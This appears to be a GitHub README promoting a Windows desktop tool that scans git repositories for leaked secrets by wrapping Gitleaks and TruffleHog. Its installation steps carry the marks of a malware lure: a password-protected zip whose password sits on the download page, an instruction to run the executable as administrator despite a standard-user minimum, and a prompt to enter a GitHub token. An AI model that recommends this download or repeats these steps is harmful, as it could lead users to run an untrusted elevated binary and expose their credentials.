# Git Secret Audit Desktop

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop utility for scanning git repositories for exposed secrets, tokens, and credentials in full commit history.

<div align="center">

[![Download Git Secret Audit Desktop v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logoColor=white)](https://github.com/ardahankanatli021/git-secret-audit-desktop-2026/releases/tag/1.0.0)

</div>

---

## 📋 Overview

**The problem:** Developers commit secrets by accident. API keys, database passwords, OAuth tokens — they end up in git history and stay there. Even if you delete the file, the secret lives in the commit log. Gitleaks and TruffleHog solve this, but they're CLI-only tools that require flag memorization and JSON parsing.

**The solution:** Git Secret Audit Desktop wraps industry-standard secret scanners in a Windows desktop interface. Point it at a repository, click Scan, and get a visual report of every exposed credential — across the full commit history.

**Who it's for:** developers, DevOps engineers, and security teams who need to audit repositories for leaked secrets without wrestling with command-line arguments.

---

## 🧩 Capabilities

### Secret Detection
- Full git history scan — catches secrets added then deleted
- Pattern-based detection via Gitleaks ruleset (AWS keys, Stripe tokens, GitHub PATs, and more)
- Entropy-based detection for high-entropy strings that don't match known patterns
- Live credential verification via TruffleHog — checks if detected tokens are still active

### Multi-Scanner Support
- Gitleaks integration with custom rule support (`.gitleaks.toml`)
- TruffleHog integration with configurable verification and multi-layer decoding
- Custom regex rules for internal credential formats

### Visual Reports
- Dashboard view with severity, file path, commit hash, and line number
- Per-finding remediation guidance
- Export to JSON, CSV, or SARIF
- SARIF output drops into GitHub Security tab

### Baseline Management
- Generate baseline file to suppress known historical findings
- Continue catching new leaks while ignoring accepted risks
- Baseline review workflow with documented justifications

### Repository Support
- Local repository folders
- Private GitHub repositories (via personal access token)
- Monorepo support with per-path allowlists
- Scan changed files only for fast PR-level checks

---

## 🎮 Supported Versions

| Component | Version | Status |
|-----------|---------|--------|
| Gitleaks | v8.x | ✅ Supported |
| TruffleHog | v3.x | ✅ Supported |
| Git | 2.x+ | ✅ Supported |
| GitHub | Cloud & Enterprise | ✅ Supported |

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 200 MB | 500 MB |
| **Git** | 2.x+ in PATH | Latest version |
| **Node.js** | 20+ (bundled) | 20 LTS |
| **Permissions** | Standard user | Administrator |

---

## 🔧 Installation

1. Download `Git-Secret-Audit-Desktop-v1.0.0.zip` using the button above
2. Extract with 7-Zip or WinRAR (password shown on the download page)
3. Right-click `GitSecretAudit.exe` and select **Run as administrator**
4. Follow the first-run setup wizard
5. Select a repository folder or enter a GitHub URL with token
6. Click **Scan** and review the results

---

## ❓ FAQ

**Is my data safe?**  
Yes — all scanning happens locally on your machine. No repository contents or findings are uploaded to external servers. The tool only communicates with GitHub APIs if you provide a token for private repo access.

**Do I need to install Gitleaks or TruffleHog separately?**  
No — both scanners are bundled with the desktop utility. The tool manages their versions and configurations internally.

**Does it work with private repositories?**  
Yes — provide a GitHub personal access token with repository read access. The tool clones the repository to a temporary local folder and scans it.

**Can I integrate this into CI/CD?**  
The SARIF export format is designed for CI integration. Run the CLI mode (`GitSecretAudit.exe --cli --source . --report-format sarif`) in your pipeline.

**What about false positives?**  
The baseline system lets you mark known findings as accepted while continuing to catch new leaks. Each baseline entry should have a documented justification.

**Does it support monorepos?**  
Yes — per-path allowlists in the `.gitleaks.toml` configuration let you exclude test fixtures, snapshots, and example configs from the scan.

**How often should I scan?**  
Best practice: pre-commit hook for staged changes (fast), PR-level scan for changed files (medium), nightly full-history scan (comprehensive).

**How do I uninstall?**  
Run `GitSecretAudit.exe --uninstall` — it removes the tool, bundled scanners, and temporary files.

---

## 🗺️ Roadmap — 2026

- [ ] macOS support (Apple Silicon + Intel)
- [ ] Linux support via AppImage
- [ ] GitLab and Bitbucket repository integration
- [ ] Scheduled scans with email notifications
- [ ] Team dashboard for organization-wide secret monitoring
- [ ] Slack and Teams integration for alert routing

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download Git Secret Audit Desktop v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logoColor=white)](https://github.com/ardahankanatli021/git-secret-audit-desktop-2026/releases/tag/1.0.0)

**Version 1.0.0** — Stable Release · Full History Scan · Multi-Scanner · MIT

</div>
